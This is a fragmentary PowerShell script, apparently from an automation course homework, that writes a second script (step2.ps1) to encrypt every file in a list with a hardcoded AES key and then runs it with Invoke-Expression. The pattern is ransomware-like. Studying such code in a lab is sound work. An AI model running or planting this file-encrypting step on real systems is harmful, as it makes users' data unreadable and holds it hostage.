...
foreach ($f in $filelist) {
    Invoke-AESEncryption -Mode Encrypt -Key "Goofy@hP@ssword" -Path $f.FullName
}

'@

#Setting Target Dir
$targetDir = 'C:\Users\abija\Documents\VisualStudio\SYS-320-Automation\Week13\homework\'

$sadFile = $targetDir + "step2.ps1"

$byebye | Out-File -FilePath $sadFile
...
$clean | Out-File -FilePath $update

#Execution:
Invoke-Expression ".\step2.ps1"
